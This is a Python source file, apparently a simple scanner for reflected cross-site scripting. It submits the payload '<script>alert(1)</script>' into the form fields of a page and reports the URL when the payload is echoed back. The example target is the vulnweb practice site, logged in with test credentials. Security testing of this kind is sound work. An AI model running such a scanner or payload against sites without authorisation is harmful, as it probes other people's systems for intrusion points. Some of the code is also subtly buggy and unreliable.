from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import requests
import re

string_terminators = ["", "'", ";", "';", ]
payloads = ["<script>alert(1)</script>"]
unique_string = "webappxss94949494"


class xss_scanner:


    exploited_urls = []

    def __init__(self, url, cookies=None, headers=None):
        self.url = url
        self.cookies = cookies,
        self.headers = headers

    def forms(self):

        if self.cookies is not None:
            content = bs(requests.get(self.url, cookies=self.cookies[0]).content.decode(), "html.parser")
        else:
            content = bs(requests.get(self.url).content, "html.parser")

        form_Content = content.find_all("form")
        forms = []

        for form in form_Content:
            form_specs = {}
            action = form.attrs.get("action").lower()
            method = form.attrs.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                if hasattr(input_tag, "value"):
                    input_value = input_tag.attrs.get("value")
                else:
                    input_value = ""
                input_name = input_tag.attrs.get("name")
                inputs.append({"type": input_type, "name": input_name, "value": input_value})

            form_specs["action"] = action
            form_specs["method"] = method
            form_specs["inputs"] = inputs
            forms.append(form_specs)
        return forms

    def submit(self, form_specs, payload):
        data = {}
        target_url = urljoin(self.url, form_specs["action"])
        inputs = form_specs["inputs"]
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search" \
                    or input["type"].lower() == "textarea":
                input["value"] = payload

                input_name = input["name"]
                input_value = input["value"]

                if input_name and input_value:
                    data[input_name] = input_value

            else:
                value = input["name"]
                name = input["value"]
                data[name] = value

        if form_specs["method"] == "post":
            if self.cookies is not None:
                response = requests.post(target_url, data=data, cookies=self.cookies[0]).content.decode()
            else:
                response = requests.post(target_url, data=data).content.decode()
        else:
            if self.cookies is not None:
                response = requests.get(target_url, params=data, cookies=self.cookies[0]).content.decode()
            else:
                response = requests.get(target_url, params=data).content.decode()

        return response,target_url

    def main(self):
        forms = self.forms()
        for form in forms:
            for P in payloads:
                response = self.submit(form, P)
                if P in response[0]:
                    print("XSS Found at {} with the payload {}".format(response[1],P))


if __name__ == '__main__':
    scanner = xss_scanner(url="http://testphp.vulnweb.com/userinfo.php", cookies={"login": "test/test"})
    scanner.main()
